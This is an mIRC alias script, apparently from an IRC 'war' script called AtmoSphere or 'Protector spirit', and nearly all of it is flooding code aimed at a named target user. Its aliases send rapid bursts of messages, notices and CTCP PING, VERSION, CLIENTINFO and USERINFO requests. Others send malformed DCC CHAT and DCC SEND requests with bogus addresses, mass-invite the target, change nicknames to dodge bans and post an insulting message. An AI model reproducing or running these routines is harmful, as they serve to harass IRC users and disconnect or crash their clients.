;                                   =================
;                                      ### Nick Changer###
;                                   =================
/rand-nick {
  /nick $rand(a,z) $+ $rand(A,Z) $+ $rand(1,9) $+ $rand(1,9)
  /PRIVMSG %nick-priv-flood : Big lammer, suck this words..
  .raw privmsg %nick-priv-flood :DCC CHAT 000000000 000 000 25 
  .raw privmsg %nick-priv-flood :DCC SEND friend.zip 3353362454 25 666
}
/f1 {
  .ignore  *!*@* 
  echo -a 0,1Ignoring All User is Now 8 Enable
}
/f2 {
  .ignore -r *!*@* 
  echo -a 0,1Ignoring All User is Now 8 Disable
} 
/cjoin {
  .raw join $1 
}
/cpart {
  .raw part $1 releasing this chan..
}
/tf { .timer 5 1 .msg $1 %lag2 | .msg $1 %lag2 | .msg $1 %lag2 | .msg $1 %lag2 | .msg $1 %lag2 | .msg $1 %lag2 }
/nf { .timer 5 1 .notice $1 %lag2 | .notice $1 %lag2 | .notice $1 %lag2 | .notice $1 %lag2 | .notice $1 %lag2 | .notice $1 %lag2 }
/if { .timer 2 1 .raw invite $1 #Atmosphere1 $+ $chr(160) | .raw invite $1 #Atmosphere2 $+ $chr(160) }
/cef { .timer 8 1 .ctcp $1 ECHO 6 $+ 6 $+ %verc 4 $+ %verc 6 $+ %verc 4 $+ %verc 6 $+ %verc 4 $+ %verc 6 $+ %verc 4 $+ %verc 6 $+ %verc 4 $+ %verc }
/cpf { .ctcp $1 PING | .ctcp $1 PING | .ctcp $1 PING | .ctcp $1 PING | .ctcp $1 PING | .ctcp $1 PING | .ctcp $1 PING | .ctcp $1 PING | .ctcp $1 PING | .ctcp $1 PING | .ctcp $1 PING | .ctcp $1 PING | .ctcp $1 PING | .ctcp $1 PING | .ctcp $1 PING }
/cvf { .ctcp $1 VERSION | .ctcp $1 VERSION | .ctcp $1 VERSION | .ctcp $1 VERSION | .ctcp $1 VERSION | .ctcp $1 VERSION | .ctcp $1 VERSION | .ctcp $1 VERSION | .ctcp $1 VERSION | .ctcp $1 VERSION | .ctcp $1 VERSION | .ctcp $1 VERSION | .ctcp $1 VERSION | .ctcp $1 VERSION | .ctcp $1 VERSION }
/ccf { .ctcp $1 CLIENTINFO | .ctcp $1 CLIENTINFO | .ctcp $1 CLIENTINFO | .ctcp $1 CLIENTINFO | .ctcp $1 CLIENTINFO | .ctcp $1 CLIENTINFO | .ctcp $1 CLIENTINFO | .ctcp $1 CLIENTINFO | .ctcp $1 CLIENTINFO | .ctcp $1 CLIENTINFO | .ctcp $1 CLIENTINFO | .ctcp $1 CLIENTINFO | .ctcp $1 CLIENTINFO | .ctcp $1 CLIENTINFO | .ctcp $1 CLIENTINFO }
/cuf { .ctcp $1 USERINFO | .ctcp $1 USERINFO | .ctcp $1 USERINFO | .ctcp $1 USERINFO | .ctcp $1 USERINFO | .ctcp $1 USERINFO | .ctcp $1 USERINFO | .ctcp $1 USERINFO | .ctcp $1 USERINFO | .ctcp $1 USERINFO | .ctcp $1 USERINFO | .ctcp $1 USERINFO | .ctcp $1 USERINFO | .ctcp $1 USERINFO | .ctcp $1 USERINFO }
/call { .ctcp $1 PING | .ctcp $1 VERSION | .ctcp $1 CLIENTINFO | .ctcp $1 USERINFO | .ctcp $1 PING | .ctcp $1 VERSION | .ctcp $1 CLIENTINFO | .ctcp $1 USERINFO | .ctcp $1 PING | .ctcp $1 VERSION | .ctcp $1 CLIENTINFO | .ctcp $1 USERINFO .ctcp $1 PING | .ctcp $1 VERSION | .ctcp $1 CLIENTINFO | .ctcp $1 USERINFO }
/tsf { .timer 2 2 .msg $1 %lag1 | .timer 2 2 .notice $1 %lag1 | .timer 2 2 .ctcp $1 6 $+ %verc 4 $+ %verc 6 $+ %verc 4 $+ %verc 6 $+ %verc 4 $+ %verc 6 $+ %verc 4 $+ %verc 6 $+ %verc 4 $+ %verc }
/dcs { 
  .raw privmsg $1 :DCC CHAT 000000000 000 000 25 | .raw privmsg $1 :DCC CHAT 000000000 000 000 25
  .raw privmsg $1 :DCC SEND AtmoSphere.zip 3353362454 25 666 | .raw privmsg $1 :DCC SEND AtmoSphere.zip 3353362454 25 666
  .raw privmsg $1 :DCC CHAT 000000000 000 000 25 | .raw privmsg $1 :DCC CHAT 000000000 000 000 25
  .raw privmsg $1 :DCC SEND AtmoSphere.zip 3353362454 25 666 | .raw privmsg $1 :DCC SEND AtmoSphere.zip 3353362454 25 666
  .raw privmsg $1 :DCC CHAT 000000000 000 000 25 | .raw privmsg $1 :DCC CHAT 000000000 000 000 25
}
/dcf { 
  .raw privmsg $1 :DCC CHAT 000000000 000 000 25 | .raw privmsg $1 :DCC CHAT 000000000 000 000 25
  .raw privmsg $1 :DCC CHAT 000000000 000 000 25 | .raw privmsg $1 :DCC CHAT 000000000 000 000 25
  .raw privmsg $1 :DCC CHAT 000000000 000 000 25 | .raw privmsg $1 :DCC CHAT 000000000 000 000 25
  .raw privmsg $1 :DCC CHAT 000000000 000 000 25 | .raw privmsg $1 :DCC CHAT 000000000 000 000 25
  .raw privmsg $1 :DCC CHAT 000000000 000 000 25 | .raw privmsg $1 :DCC CHAT 000000000 000 000 25
}
/dsf {
  .raw privmsg $1 :DCC SEND AtmoSphere.zip 3353362454 25 666 | .raw privmsg $1 :DCC SEND AtmoSphere.zip 3353362454 25 666
  .raw privmsg $1 :DCC SEND AtmoSphere.zip 3353362454 25 666 | .raw privmsg $1 :DCC SEND AtmoSphere.zip 3353362454 25 666
  .raw privmsg $1 :DCC SEND AtmoSphere.zip 3353362454 25 666 | .raw privmsg $1 :DCC SEND AtmoSphere.zip 3353362454 25 666
  .raw privmsg $1 :DCC SEND AtmoSphere.zip 3353362454 25 666 | .raw privmsg $1 :DCC SEND AtmoSphere.zip 3353362454 25 666
  .raw privmsg $1 :DCC SEND AtmoSphere.zip 3353362454 25 666 | .raw privmsg $1 :DCC SEND AtmoSphere.zip 3353362454 25 666
}
/connect /%ddecmd /echo  -a 4xXx 0 $ddename 12 Now Connect to 9 $server
;                                   ========================================
;                                               ### Advices, Warnings to main script ###
;                                   ========================================
/load /dde sod command "" /echo  -a 0,1::8(Protector spirit)0:: 15is ready to serve master..
/conn /dde sod command "" /echo  -a 0,1::8(Protector spirit)0:: 15is connected to0 $server 15actual target is:0 %nick-priv-flood
